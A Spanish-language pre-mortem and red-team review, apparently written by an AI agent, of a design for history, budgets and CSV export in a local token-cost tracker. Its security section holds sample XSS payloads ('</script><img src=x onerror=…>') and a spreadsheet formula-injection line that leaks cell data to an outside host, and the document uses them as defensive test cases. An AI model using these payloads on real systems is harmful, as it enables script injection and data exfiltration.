# Pre-mortem y red team del diseño de la Fase 2 (histórico, presupuestos, CSV)

Fecha: 2026-10-14 (Europe/Madrid) · Objeto: `plans/261013-2350-sqlite-historico/fase2-diseno.md` (v1) contrastado con el código
de `feat/fase1-ingesta-hermes`. Solo lectura; no se ha ejecutado nada que escriba en `~/.cost-guard` ni en `Application Support`.
No se repiten los hallazgos de `red-team-fase1-261014.md` salvo cuando la fase 2 los agrava. Cada afirmación sobre el código
lleva `fichero:línea`; lo que es opinión o especulación va marcado como tal.

## TL;DR

El diseño es sólido en lo que reutiliza (agregado `horas` en UTC, nombres calculados al leer, sesión obligatoria, `QUOTE_ALL`
+ neutralización, auditoría sin contenido). Lo que lo hundiría a los seis meses no está en lo que dice, sino en lo que deja
implícito:

1. **El estado de avisos no puede vivir en `state.json`**: el panel lo borra en cada "Guardar ajustes"
   (`infobar/servidor_local.py:306` → `infobar/config_y_estado.py:209-214`) y cada subida de `VERSION_ESTADO` lo vacía
   (`config_y_estado.py:186-195`). Los avisos se repetirían justo cuando el usuario toca un presupuesto.
2. **Histórico y panel no coincidirán** mientras `almacen` siga en `sombra` (valor por defecto, `infobar/agregacion.py:96`): el
   panel sale de los logs y Histórico de la base (−40 % en Claude, decisión 1 del dueño). Y aunque esté `activo`, `historico()`
   debe aplicar la misma lista `ignorar` que `agregar()` (`agregacion.py:145-154`) o el test "deben coincidir" falla.
3. **El presupuesto por proyecto está anclado a `proyecto_raw`, pero el panel agrupa por alias** (`agregacion.py:148,168`): tres
   rutas con el mismo alias "Cliente X" tendrían un presupuesto que solo cuenta una. Y "nombre del plan" es ambiguo: el plan
   que ve el usuario pasa por `aliases` y `plan_final` (`agregacion.py:169-171`), no es `plan_de()` (`infobar/consulta.py:28-34`).
4. **El panel ya tiene XSS almacenado desde los logs** (modelo y proveedor son texto libre de 120 caracteres sin más filtro que el
   de control, `infobar/almacen.py:371-383,411`, y `app.js` los pinta con `innerHTML`: `panel_assets/app.js:195,216,287`;
   `panel.py:71` incrusta el JSON en `<script>` sin escapar `</`). Sin CSP (`servidor_local.py:170-180`). La fase 2 añade
   `POST /exportar-csv`, que convierte ese XSS en exfiltración total del histórico. Hay que cerrarlo en esta fase.
5. **`--cifrar` con la clave del destinatario de copias produce un CSV que el propio usuario no puede abrir** (la privada está
   fuera del equipo, `panel_assets/ajustes.js:148`) y, con `TIPO_EXPORT`, `--importar` lo confundiría con una base
   (`infobar/cgx.py:341`). El cifrado del CSV debe ser por frase y con un tipo `cgx` nuevo.
6. **Zona horaria**: `zoneinfo` necesita una clave IANA que Windows no da; el atajo habitual (`datetime.now().astimezone()`) es un
   desplazamiento fijo y rompe el 25-10-2026. `consultar()` usa la librería C (`consulta.py:44-47`, `time.localtime`), que sí
   cambia de hora: Histórico debe usar el mismo mecanismo o divergen un día de cada dos tras el cambio.

## Lo que está bien y no debe tocarse

- Leer de `horas` (mantenida con delta en la misma transacción que `turnos`: `almacen.py:425-430,458,485-486`) y derivar
  nombres al leer. Reetiquetar el pasado al cambiar un alias es coherente con `nombre_proyecto()` (`infobar/ajustes.py:25-30`).
- Total = `gi+go+cr+cw`: es la única suma que usa todo el producto (`agregacion.py:116,175`; la barra de presupuesto actual en
  Ajustes también, `ajustes.js:132` sobre `proyectos_origen` = `agregacion.py:179`).
- `mode=ro` para todo lo que no es el ingestor (`almacen.py:123-124`); la lista cerrada de columnas de `totales()`
  (`almacen.py:29,574-582`): `historico()` debe apoyarse en ella y no abrir SQL nuevo fuera de `almacen.py`.
- Sesión obligatoria también en GET (`servidor_local.py:219`), ticket en memoria, cookie `HttpOnly; SameSite=Strict`
  (`:209`), POST con `Content-Type` y `Origin` exactos (`:266-270`), `Sec-Fetch-Site` (`:190`). `/exportar-csv` debe pasar por
  exactamente esa puerta (`_cuerpo_json`), sin excepciones para descargas.
- `QUOTE_ALL`, BOM, `\r\n`, prefijo `'` en `= + - @ \t \r`, cifras como enteros, tope de filas, nombre de fichero generado,
  auditoría sin contenido, nada en `~/Downloads` desde el servidor, pintado por DOM como en `ajustes.js:7-14`.
- Proyección oculta antes del día 3 y marcada como estimación; aviso una vez por umbral y periodo; `oculto` sigue contando.

## PRE-MORTEM — "se implementó tal cual y a los seis meses…"

Severidad: C crítica · A alta · M media · B baja. Cada punto: mecanismo → cambio de diseño → cómo se prueba.

### PM1 (C) Los avisos se repiten cada vez que el usuario guarda ajustes
- Mecanismo: el diseño guarda `{clave: {periodo, avisado}}` en `state.json`. `/guardar` llama a `olvidar_cache()`
  (`servidor_local.py:306`), que borra `state.json` (`config_y_estado.py:209-214`). `leer_estado()` descarta el fichero si
  `version != VERSION_ESTADO` (`:186-195`), y esa versión se sube a menudo (commit `de40a04`). Además `state.json` lo escriben
  los hilos HTTP y `panel.py` por `escanear()` (`agregacion.py:85`) cuando `almacen` no está activo.
- Cambio: fichero propio `DATOS/avisos.json` (0600, escritura atómica como `exportacion._guarda`, `infobar/exportacion.py:211-216`),
  escrito **solo** por el hilo trabajador de la barra. Clave = `ambito|nombre|periodo_tipo`; se purgan entradas de presupuestos
  que ya no existen. Nunca en `state.json` ni en `config.json`.
- Prueba: guardar ajustes desde el panel entre dos ciclos → el aviso del 80 % no se repite; subir `VERSION_ESTADO` → tampoco.

### PM2 (C) Histórico y panel muestran cifras distintas del mismo mes
- Mecanismo: con `almacen: sombra` (por defecto, `agregacion.py:96`) el panel y la barra salen de `escanear()`; Histórico
  siempre de la base. Las divergencias aceptadas (Claude −40 %, Hermes +17/47 %) aparecen como "el panel miente". Y con `activo`,
  `consultar()` excluye los modelos de `ignorar` en `agregar()` (`agregacion.py:145-154`), cosa que una consulta sobre `horas`
  no hará por sí sola.
- Cambio: Histórico y presupuestos **exigen `almacen: activo`**; si no, la pestaña muestra un aviso y nada más (o la fase 2
  cierra la sombra antes). `historico()` recibe y aplica la misma lista `ignorar`. El test de coincidencia (30 días) se hace
  con reloj inyectado en tres fechas: 2026-10-20, 2026-10-26 y 2026-11-10 (cruza el cambio de hora), no solo con la de hoy.
- Prueba: la anterior, más una base sintética con un modelo `synthetic` que no debe aparecer en ninguno de los dos.

### PM3 (A) El presupuesto por proyecto no cubre lo que el usuario cree
- Mecanismo: `nombre` es `proyecto_raw`. El mismo cliente aparece con varios raws (Claude y Codex comparten criterio,
  `infobar/ingesta.py:244-256`, pero `codex/otros`, `hermes/otros`, `sin-proyecto` y cambios de carpeta generan raws
  distintos). El panel suma por nombre mostrado (`agregacion.py:148,168`): el usuario pone alias "Cliente X" a tres raws, ve una
  barra y pone un presupuesto… que solo cuenta uno. Nunca avisa.
- Cambio: el presupuesto de ámbito proyecto se evalúa sobre el **grupo de raws cuyo nombre mostrado coincide** con el del raw
  elegido (misma función `nombre_proyecto`). En la UI, una fila por nombre mostrado. Documentar que renombrar un alias mueve
  el grupo (coherente con el reetiquetado retroactivo).
- Prueba: dos raws con el mismo alias y un presupuesto; el consumo de ambos suma para el umbral.

### PM4 (A) El presupuesto por plan nunca salta
- Mecanismo: "nombre del plan" se interpreta como `plan_de(agente, proveedor)` (`consulta.py:28-34`: "Claude (Max)",
  "OpenAI (Codex)" o el proveedor crudo del log). El usuario escribe el plan que ve en Ajustes, que es el resultado de
  `aliases` + `plan_final` (`agregacion.py:169-171`, `ajustes.js:123-127`). No coincide y el presupuesto queda a 0 % para
  siempre. Además, cambiar un alias mueve el histórico de plan: un presupuesto puede pasar de 50 % a 120 % de golpe.
- Cambio: definir `nombre` como el plan **final** (post-alias), seleccionado en la UI de una lista cerrada
  (`datalist` "planes", `ajustes.js:128`), y evaluar con el mismo camino `proveedor_de/plan_final` que `agregar()`. El aviso tras
  un cambio de alias se acepta y se indica en el texto ("tras reetiquetar").
- Prueba: un origen con alias → plan "NaN"; presupuesto de plan "NaN" cuenta ese consumo.

### PM5 (A) Días desplazados una hora tras el 25-10-2026
- Mecanismo: dos caminos tentadores fallan. (a) `datetime.now().astimezone().tzinfo` devuelve un desplazamiento fijo (+02:00
  hoy): usado para "medianoche local → UTC" en noviembre, todos los días empiezan a las 23:00 del anterior. (b) `desde + n*86400`
  para avanzar días: el 25-10 tiene 25 horas y a partir de ahí cada límite va una hora corrido. `consultar()` evita ambos
  usando `time.localtime` (`consulta.py:44-47`) y `sombra.dias_cerrados` avanza por fechas (`infobar/sombra.py:67-71`).
- Cambio: límites de día/semana/mes por **fecha** (`date`) y conversión a UTC con la librería C (`time.mktime` de una fecha a
  00:00 local), que cambia de hora en los tres sistemas sin clave IANA; `zoneinfo` solo cuando se inyecta una zona (tests).
  Regla explícita: el nombre del día lo da la zona; la aritmética se hace en UTC.
- Prueba: fixtures del red team de fase 1 (00:30Z y 01:30Z del 25-10, 01:30Z del 29-03) con `TZ=Europe/Madrid`; el total del
  día 25 suma 25 horas y el 26 empieza a 23:00Z del 25.

### PM6 (M) Horas partidas en zonas de media hora
- Mecanismo: "una hora UTC nunca se parte entre dos días" solo es cierto en zonas de hora entera. `consultar()` usa cubos de
  15 min precisamente por eso (`consulta.py:19`). En `Asia/Kolkata`, Histórico (sobre `horas`) y el panel (sobre `turnos`)
  difieren cada día en la hora 23:30-00:00.
- Cambio: aceptar y **documentar** la limitación en Histórico (y en el README), o bien calcular los dos cubos frontera del
  día desde `turnos`. Para el público objetivo (España, Windows) vale documentarlo.
- Prueba: test con `Asia/Kolkata` que verifique la diferencia esperada y no falle en silencio.

### PM7 (M) Comparación con el periodo anterior sobre meses sin datos
- Mecanismo: la base empieza con los 30 días que quedan en los logs de Claude (`cleanupPeriodDays: 30`). Los meses anteriores
  a la instalación son 0: la comparación muestra "+∞ %" o "−100 %" y la proyección del primer mes está sesgada.
- Cambio: `historico()` devuelve `datos_desde` (mín. `hora` de `horas`) y los cubos anteriores salen como `null` ("sin datos"),
  no como 0; la comparación se omite si el periodo anterior no está completo.
- Prueba: base sintética que empieza a mitad de mes.

### PM8 (M) Datos que llegan tarde y proyección
- Mecanismo: el upsert monótono sube contadores de horas pasadas (`almacen.py:483-486`), Hermes fecha el primer delta en
  `started_at` (fase 1, 2.8) y el ingestor tiene presupuesto de tiempo por vuelta (`infobar/ingestor.py:108-121`), así que
  tras un arranque la base va por detrás varios ciclos. Un presupuesto al 79 % puede saltar a 100 % sin pasar por 80 % (ambos
  umbrales en el mismo ciclo) y el aviso del 80 % se pierde o se emite junto al del 100 %.
- Cambio: la evaluación emite el **umbral más alto alcanzado** y marca los inferiores como dados (un solo aviso). Si
  `ultima_vuelta.completo` es falso (`ingestor.py:91` devuelve `completo`), se pospone la evaluación de ese ciclo.
- Prueba: salto de 70 % a 105 % en un ciclo → un único aviso de 100 %.

### PM9 (M) El panel se recarga cada 60 s y destruye la vista de Histórico
- Mecanismo: `setInterval(() => { if (!enAjustes) location.reload(); }, 60000)` (`ajustes.js:203`); `vista()` solo conoce dos
  vistas (`:20-26`). Histórico con un rango de seis meses se reinicia cada minuto, y cada recarga regenera `panel.html` con
  `panel.py` en subproceso (`servidor_local.py:224-226`).
- Cambio: la recarga automática se suspende en Histórico; la pestaña y el rango persisten en el hash (`#historico`), como
  `#ajustes` (`ajustes.js:24,205`).
- Prueba: manual en revisión; test de que el hash se restaura.

### PM10 (M) Migración de `presupuesto_mes_tokens` deja dos verdades
- Mecanismo: "se conserva el campo antiguo y gana la lista nueva". Ajustes sigue pintando y guardando el campo antiguo
  (`ajustes.js:136`, `ajustes.py:117-119`): el usuario cambia ahí el presupuesto y no pasa nada. Si la migración corre en
  `cfg()` como `_migra_servidores` (`config_y_estado.py:45-47,68-83`), la ejecutan `panel.py`, el CLI y los hilos HTTP; en
  Windows no hay `fcntl` y la escritura concurrente no está protegida (`config_y_estado.py:8,91`).
- Cambio: migrar **una vez en la barra** (no en `cfg()`), dejar el campo antiguo a 0 tras migrar (no conservarlo), quitarlo de
  la UI, y que `normalizar`/`errores_config` validen `presupuestos` (`ajustes.py:53`, `servidor_local.py:119`) con lista
  cerrada de campos; `guardar_config` ya conserva claves desconocidas (`config_y_estado.py:160-161`).
- Prueba: config antigua con tres proyectos con presupuesto → tres filas; segundo arranque no duplica; guardar desde el
  panel no resucita el campo.

### PM11 (M) "Semana" significa dos cosas
- Mecanismo: el panel y la barra llaman "Semana" a los últimos 7 días (`agregacion.py:123,183-184,237`); el presupuesto
  semanal sería semana natural ISO. Dos cifras distintas con el mismo nombre en la misma pantalla.
- Cambio: etiquetar "semana natural (lunes)" en presupuestos, o posponer el periodo semanal a la v2 de la fase.

### PM12 (B) Rendimiento con años de datos
- Verificado: `horas` tiene PK `(espacio_id, hora, …)` (`almacen.py:70-75`), por lo que cualquier rango es un barrido de índice.
  Estimación (especulativa): 40-200 k filas/año; 400 consultas de cubo con `totales()` o una sola con `GROUP BY` sobre
  3 años quedan por debajo de 200 ms. La evaluación de presupuestos es una consulta por ciclo. No hay problema de volumen;
  el riesgo es `agrupa=proyecto` devolviendo cientos de series: hay que "top N + otros", no error 400.
- Prueba: base sintética de 3 años; `historico()` en < 1 s; 250 proyectos → 200 series + "otros".

### PM13 (A) Windows
- `import fcntl` a nivel de módulo (`config_y_estado.py:8`): el paquete no importa en Windows; la fase 2 mete más estado por
  ese módulo. `zoneinfo` requiere `tzdata` (ya decidido) y una clave IANA que Windows no expone (ver PM5). Los nombres de
  fichero no pueden llevar `:` (usar `AAAAMMDD-HHMMSS`, como `exportacion.nombre_copia`, `exportacion.py:89-92`).
  `os.replace` con antivirus: ya hay `reemplazar()` (`:124-132`). Notificaciones: `rumps` solo macOS (`costbar.py:98`).
- Cambio: bloqueo de fichero por sistema (`fcntl`/`msvcrt`) antes de la fase 2 o, mejor, que el fichero de avisos tenga un solo
  escritor y no necesite bloqueo. Fechas con la librería C (PM5). Aviso de sistema solo en macOS en esta fase.

## RED TEAM — vectores

### RT1 (C) XSS almacenado desde los logs → exfiltración por `/exportar-csv` y `/clave`
- Evidencia: `modelo` y `proveedor` admiten cualquier texto no-control hasta 120 caracteres (`almacen.py:371-383,411-413`);
  los logs son escribibles por una herramienta ejecutada en sesión (fase 1, 2.1). El panel los pinta con `innerHTML`:
  modelo en `app.js:195` y `:216`, plan/proveedor en `:92` (dentro de un atributo `onclick`), `:154-156`, proyecto en `:287`
  y vía `graficos.js:13-25` (`${d[0]}`). `panel.py:71` incrusta `json.dumps(d)` dentro de `<script>` sin escapar `</` ni
  `<!--`: un modelo `</script><script>…` rompe el bloque. No hay `Content-Security-Policy` (`servidor_local.py:170-180`).
  Con sesión activa, el script puede `POST /clave` (sobrescribir claves del Llavero, `:314-331`), `POST /guardar` y, con la
  fase 2, `POST /exportar-csv` y sacar el CSV con `fetch` a un host externo.
- Cambio de diseño: (1) en `panel.py`, escapar `<`, `>`, `&`, U+2028/2029 en el JSON incrustado (`<`…); (2) cabecera
  CSP en todas las respuestas HTML: `default-src 'none'; script-src 'nonce-…'; style-src 'nonce-…'; img-src 'self' data:;
  connect-src 'self'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'` (el panel ya se genera por petición, así que
  el nonce es viable); (3) convertir a DOM los puntos de `app.js` que pintan nombres de modelo/plan/proyecto, o como mínimo
  pasarlos por un escape antes de la fase 2. No basta con "los datos nuevos van por DOM" cuando los viejos ya son un agujero.
- Prueba: base sintética con modelo `</script><img src=x onerror=…>` y proveedor `');alert(1)//`; el panel no ejecuta nada y
  la CSP bloquea `fetch` a `http://127.0.0.2`.

### RT2 (A) Inyección de fórmulas: el vector no es solo la carpeta
- Evidencia: `proyecto_raw` sale casi siempre alfanumérico porque los agentes hacen slug antes (`ingesta_codex.py:21-22`,
  `ingesta_opencode.py:59`, `ingesta_hermes.py:72`, `ingesta.py:244-256`), pero Claude usa el nombre de carpeta de
  `~/.claude/projects` tras `unquote` (`ingesta_claude.py:24`), y **alias**, **plan**, **proveedor** y **modelo** son texto libre
  (`ajustes.py:30,76`; `almacen.py:411`). Un modelo `=HYPERLINK("http://x/?"&A1)` en un log va directo al CSV.
- Cambio: la neutralización se aplica a **toda** celda de texto, cabeceras incluidas, y además se sustituyen caracteres de
  control, bidi (U+202A-202E, U+2066-2069) e invisibles (U+200B-200F, U+2060, U+FEFF) por `?`, también en el panel. `normalizar`
  debe rechazar alias y nombres de presupuesto con control o bidi (hoy solo hace `strip`, `ajustes.py:117`). Separador: Excel
  es-ES abre un CSV con coma en una sola columna; usar `;` o una primera línea `sep=,` (decidir, ver D7).
- Prueba: mutaciones sobre `= + - @ \t \r \n |` en las cuatro columnas de texto; RLO en un alias se exporta como `?`.

### RT3 (A) `--cifrar` con la clave de copias: ilegible para el usuario y confundible con una base
- Evidencia: las copias se cifran a destinatario con privada fuera del equipo (`exportacion.py:161-179`, `ajustes.js:148`);
  `cgx._exige_tipo` distingue `TIPO_EXPORT`/`TIPO_COPIA` (`cgx.py:341`) y `cifrar_con_frase` ya existe (`cgx.py:224`).
- Cambio: el CSV cifrado usa **frase** (`cifrar_con_frase`) con un tipo nuevo `csv` en la cabecera para que `--importar` y
  `--probar-restauracion` lo rechacen. Ofrecerlo siempre, no solo si hay destinatario.
- Prueba: `--importar` sobre un `.cgx` de CSV falla con mensaje claro; descifrado con frase recupera el CSV byte a byte.

### RT4 (A) Copias en claro que nadie borra
- El diseño escribe el CSV en `DATOS/exportaciones/` **y** lo devuelve como descarga. Si el servidor persiste una copia por cada
  botón, se acumulan CSV en claro con nombres de clientes junto a una base que se cifra con esmero. La exclusión de Time Machine
  y `ruta_no_fiable` (`infobar/plataforma.py:32-47`) cubren el directorio, pero `~/Downloads` del navegador no está bajo control.
- Cambio: el botón del panel **no persiste nada** en el servidor (CSV en memoria, tope de filas, `Content-Disposition` con nombre
  ASCII fijo generado); `exportaciones/` solo para el CLI y con aviso en pantalla "queda en claro en RUTA". La auditoría registra
  "panel" o "cli", nunca la ruta completa (puede llevar el usuario o el cliente). Prohibido `log()` con la ruta (regla para la
  revisión de código: `grep` de `exportar` en `log(`).

### RT5 (M) Parámetros de `/historico` y `/exportar-csv`
- `date.fromisoformat` en Python ≥ 3.11 acepta `20261014`, `2026-W41-2` y más: validar con `^\d{4}-\d{2}-\d{2}$` **antes**.
  `hasta < desde`, rango > 400 cubos para el `paso` pedido, fechas fuera de `[2000, 2100]` (`almacen.py:26`) → 400 sin tocar la
  base. `paso`/`agrupa` por conjunto cerrado. El número de cubos se calcula aritméticamente antes de consultar.
- Concurrencia: `ThreadingTCPServer` sin tope (`servidor_local.py:333-335`); hoy solo `generando` serializa `panel.py` (`:158`).
  Un `Semaphore(2)` para `/historico` y `/exportar-csv` y respuesta 429 por encima; `timeout = 15` ya existe (`:161`).
- Series: `agrupa=proyecto` con > 200 nombres → "otros", no error. `oculto` → una serie "(ocultos)" para que las sumas cuadren
  sin revelar nombres; el total nunca se recalcula excluyéndolos (coherente con `agregacion.py:167`).
- Sesión/CSRF: GET con cookie `SameSite=Strict` + `Sec-Fetch-Site` (`:189-190`) y POST por `_cuerpo_json` (`:264-282`) son
  suficientes. No usar un `<form>` ni un GET para la descarga (obligaría a relajar `Content-Type`/`Origin`). `Content-Type:
  text/csv; charset=utf-8` + `nosniff` (ya) y sin `Content-Disposition` derivado de datos (inyección de cabecera por alias).

### RT6 (M) Fugas por nombres crudos y clasificación incompleta
- Sin alias, el nombre mostrado **es** el raw (`ajustes.py:30`): el CSV lleva nombres de carpetas de clientes por diseño. Debe
  decirse en la UI antes de exportar y el `agrupa` por defecto del CSV debería ser `plan` o `agente`, no `proyecto`.
- `CLASES` menciona `ruta`, que no existe en el esquema (`almacen.py:41-92`). Sí existen `anomalias.detalle`, que guarda
  `previo -> nuevo` de `proyecto_raw` (`almacen.py:471-474`), y `fuentes.id_fuente` (hash invertible por diccionario, fase 1
  2.10). Ambas son personales. Test: toda columna de `PRAGMA table_info` de cada tabla tiene clase; si falta, el test falla.
- La notificación de macOS sale en la pantalla de bloqueo: el texto del aviso no debe llevar el nombre del proyecto (D3).

### RT7 (M) Ruta del CLI `--exportar-csv RUTA`
- Contradicción interna: 2.3 dice `RUTA` y a la vez "nombre generado, nunca por el cliente". El patrón existente
  (`infobar/cli_copias.py:167-204`) hace `exists` + `mkstemp` en el directorio + `os.replace`: el `replace` sobre un enlace
  simbólico sustituye el enlace, no el destino (sin TOCTOU útil), y `mkstemp` crea 0600. Lo que falta: rechazar rutas bajo nube
  o red (`plataforma.ruta_no_fiable`, `:32-47`), rechazar un directorio destino que sea enlace simbólico, y en Windows evitar `:`.
- Cambio: el CLI acepta un **directorio** (o nada: `exportaciones/`) y la app pone el nombre; `--cifrar` disponible siempre.

### RT8 (B) Auditoría y log
- `exportaciones.log` crece sin tope: rotar a N líneas. Que una entrada falle no debe impedir el export (y viceversa: sin
  entrada no hay export, para que no haya exports "silenciosos"). Solo fecha UTC, rango, paso, agrupa, filas, cifrado, origen.

## Decisiones abiertas: recomendación para cada una

| # | Decisión | Recomendación | Qué la cambiaría |
|---|---|---|---|
| D1 | Tokens del presupuesto | `gi+go+cr+cw`, sin opción. Es la única suma que usa barra, panel y Ajustes (`agregacion.py:116`, `ajustes.js:132`); las cuotas de suscripción también cuentan caché. Guardar `metrica: "total"` en cada fila para poder ampliar sin migrar. | Que un plan de pago por uso quiera presupuesto en dinero (no objetivo). |
| D2 | Semana | ISO (lunes 00:00 local), etiquetada "semana natural"; o posponer `semana` a la siguiente versión. La renovación de los planes es ventana móvil (ya cubierta por `limite_semana_tokens`), no un presupuesto. | Que el dueño quiera modelar la ventana móvil: entonces es otra función, no un periodo. |
| D3 | Aviso visual o notificación | Visual siempre; notificación de macOS solo en la **transición** (una por umbral y periodo), reutilizando `rumps.notification` (`costbar.py:191`), con texto sin nombre de proyecto ("Presupuesto 'Cliente X'…" se ve en la pantalla de bloqueo) y desactivable. Windows: solo visual en esta fase. | Que el equipo no se bloquee nunca (uso personal): entonces nombre en el aviso. |
| D4 | Dónde vive el estado de avisos | `DATOS/avisos.json`, un solo escritor (PM1). | — |
| D5 | Identidad del presupuesto por proyecto | Grupo por nombre mostrado (PM3). | Que el dueño prefiera presupuestar por carpeta exacta; entonces la UI debe avisar de que no suma alias. |
| D6 | Nombre del plan | Plan final post-alias, elegido de lista cerrada (PM4). | — |
| D7 | Separador y Excel es-ES | `;` como separador por defecto con BOM (Excel en español lo abre bien) o `sep=,` en la primera línea. Prefiero `;` y documentarlo; `QUOTE_ALL` lo hace inocuo para otros lectores. | Que el destino principal sea Google Sheets (detecta ambos). |
| D8 | Cifrado del CSV | Por frase, tipo `csv` nuevo, disponible siempre (RT3). | — |
| D9 | Persistencia del export desde el panel | Ninguna; solo el CLI escribe en disco (RT4). | — |
| D10 | Zona horaria | Librería C para límites locales → UTC; `zoneinfo` solo inyectada en tests (PM5/PM13). | Que haga falta elegir zona distinta de la del sistema (no objetivo). |
| D11 | Precondición `almacen: activo` | Histórico y presupuestos solo con `activo`; con `sombra`, aviso (PM2). | Que la fase 2 arranque después de cerrar la sombra: entonces es trivial. |

## Cambios al diseño, ordenados por severidad

1. Estado de avisos fuera de `state.json`, un solo escritor (PM1).
2. Precondición `activo` + `ignorar` en `historico()` + test de coincidencia con tres fechas (PM2).
3. Cerrar el XSS existente (escape en `panel.py`, CSP con nonce, DOM en `app.js`) **antes** de añadir `/exportar-csv` (RT1).
4. Presupuesto por grupo de nombre mostrado y plan final post-alias (PM3, PM4).
5. Fechas por librería C y aritmética por fechas, fixtures del 25-10 y 29-03 (PM5, PM13).
6. CSV cifrado por frase con tipo propio; nada persistido desde el panel; CLI a directorio con nombre generado (RT3, RT4, RT7).
7. Neutralización en todas las columnas + limpieza bidi/invisibles + validación de alias y nombres (RT2).
8. Validación aritmética de rango antes de consultar, semáforo, "otros"/"(ocultos)" (RT5).
9. Migración una sola vez en la barra, campo antiguo retirado de la UI, `presupuestos` en `normalizar`/`errores_config` (PM10).
10. `CLASES` sobre columnas reales, con `anomalias.detalle` e `id_fuente` como personales y test de cobertura (RT6).
11. `datos_desde`, cubos `null`, umbral más alto por ciclo, evaluación pospuesta si la vuelta no fue completa (PM7, PM8).
12. Recarga automática suspendida en Histórico; hash `#historico` (PM9). Etiqueta "semana natural" (PM11).

## Supuestos

- La fase 2 se implementa sobre `feat/fase1-ingesta-hermes` tal como está hoy (confianza alta: es la rama indicada).
- El público objetivo está en zonas de hora entera; las de media hora se documentan (media).
- Los logs siguen siendo escribibles por herramientas ejecutadas en sesión, como estableció el red team de fase 1 (alta).
- Las cifras de rendimiento (filas/año, tiempos) son estimación, no medición (baja): medir con la base sintética de 3 años.

Status: DONE_WITH_CONCERNS
Summary: El diseño reutiliza bien la fase 1, pero tal cual fallaría por el estado de avisos en `state.json`, la incoherencia
panel/histórico (sombra, `ignorar`, raw vs alias, plan pre/post-alias), la zona horaria sin clave IANA y un XSS ya presente que
la exportación convertiría en exfiltración; once decisiones quedan resueltas con recomendación arriba.
Preguntas sin resolver: D5 (grupo por alias o carpeta exacta) y D7 (separador `;` o `sep=,`) dependen de la preferencia del
dueño; el resto se puede fijar con las recomendaciones dadas.
